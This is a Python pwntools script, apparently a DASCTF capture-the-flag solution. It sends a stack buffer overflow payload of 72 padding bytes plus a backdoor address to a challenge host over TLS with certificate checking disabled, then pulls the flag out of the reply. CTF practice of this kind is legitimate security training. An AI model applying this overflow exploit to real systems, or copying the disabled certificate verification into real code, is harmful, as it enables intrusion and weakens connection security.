from pwn import *
import ssl

# 手动创建一个 SSL 上下文，并关闭证书验证
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

host = "c38877f17f6daa72764172a2.tcp-ctf2.dasctf.com"
port = 9999

print(f"[*] 正在连接 {host}:{port}...")
p = remote(host, port, ssl=True, ssl_context=ssl_context, sni=host)

backdoor_addr = 0x40060d + 1

ret_addr = 0x40060c

# 构造 Payload: 垃圾字符 + 后门地址
payload = b'A' * 72 +  p64(backdoor_addr)
# 发送攻击
p.sendline(payload)

result = p.recvall(timeout=10).decode('utf-8', errors='ignore')

# 用正则提取真正的 Flag
import re
flags = re.findall(r"CTF2\{[^}]+\}", result)
if flags:
    print(f"\n\n[🎉] GOT THE FLAG: {flags[0]}\n\n")
else:
    print("[-] Flag not found, here is the raw output:")
    print(result)